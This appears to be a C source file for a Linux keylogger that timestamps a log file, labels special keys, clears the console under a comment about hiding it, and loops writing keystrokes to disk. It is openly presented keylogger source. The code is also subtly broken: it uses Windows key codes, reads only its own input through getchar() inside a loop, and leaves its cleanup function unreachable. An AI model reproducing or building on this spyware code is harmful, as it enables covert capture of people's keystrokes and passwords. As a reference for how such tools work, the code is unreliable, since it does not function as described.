// Keylogger for Linux machine

#include <time.h>
#include <stdlib.h>
#include "linux_keylog.h"
#include <unistd.h>
#include "../writing/file.h"

#define SPECIAL_KEYS_LENGTH 50

// Whenever the keylogger is started, add this to the file first
void linWriteHeader(const char* filePath) {
    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }

    // Write the date and time into the file
    time_t t = time(NULL);
    struct tm st = *localtime(&t);
    char date[100];
    sprintf(date, "[%02d/%02d/%02d %02d:%02d:%02d] : ", st.tm_mday, st.tm_mon+1, st.tm_year+1900, st.tm_hour, st.tm_min, st.tm_sec);
    fputs(date, file);
    fflush(file);
    fclose(file);
}

// Convert special key into readable key
char* SpecialKeyToReadable(int data) {
    char *specialKey = NULL;
    
    switch (data) {
        case 0x08:
            specialKey = "[BACKSPACE]";
            break;
        case 0x0D:
            specialKey = "[ENTER]";
            break;
        case 0x20:
            specialKey = " ";
            break;
        case 0x12:
            specialKey = "[ALT]";
            break;
        case 0x09:
            specialKey = "[TAB]";
            break;
        case 0x10:
            specialKey = "[SHIFT]";
            break;
        case 0x11:
            specialKey = "[CONTROL]";
            break;
        case 0x1B:
            specialKey = "[ESCAPE]";
            break;
        case 0x23:
            specialKey = "[END]";
            break;
        case 0x24:
            specialKey = "[HOME]";
            break;
        case 0x25:
            specialKey = "[LEFT ARROW]";
            break;
        case 0x26:
            specialKey = "[UP ARROW]";
            break;
        case 0x27:
            specialKey = "[RIGHT ARROW]";
            break;
        case 0x28:
            specialKey = "[DOWN ARROW]";
            break;
        case 0x2E:
            specialKey = "[DELETE]";
            break;
        case 0x01:
            specialKey = "[LEFT CLICK]";
            break;
        case 0x02:
            specialKey = "[RIGHT CLICK]";
            break;
        case 0x04:
            specialKey = "[MIDDLE CLICK]";
            break;
        case 0x05:
            specialKey = "[X1 CLICK]";
            break;
        case 0x06:
            specialKey = "[X2 CLICK]";
            break;
        case 0x6F:
            specialKey = "/";
            break;
        case 0x6A:
            specialKey = "*";
            break;
        case 0x6D:
            specialKey = "-";
            break;
        case 0x6B:
            specialKey = "+";
            break;
    }
    return specialKey;
}

// Keylogger for Linux
void lin_keylog(const char* filePath) {
    // Write the header into the file
    linWriteHeader(filePath);

    // Hide the console window
    system("clear"); // Clear the console

    while (1) {
        // Sleep for 10ms
        usleep(10000);

        // Loop through all the ASCII characters
        for (int key = 0; key <= 255; key++) {
            // Check if the key is pressed
            if (getchar() == key) {
                // Check if the key is a special key
                int isSpecialKey = CheckSpecialKey(key);
                if (isSpecialKey) {
                    // Convert special key into readable key
                    char *specialKey = SpecialKeyToReadable(key);
                    if (specialKey != NULL) {
                        WriteSpecialKeyIntoFile(specialKey, filePath);
                    }
                } else {
                    // Check if the key is a letter
                    if (isalpha(key)) {
                        WriteIntoFile(tolower(key), filePath);
                    }
                }
            }
        }
    }

    // Check if the keylogger should end
    end_keylog(filePath);
}

// End the keylogger
void end_keylog(const char *filePath) {
    // Add a new line to the file
    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }
    fputs("\n", file);
    fflush(file);
    fclose(file);

    system("clear"); // Clear the console
}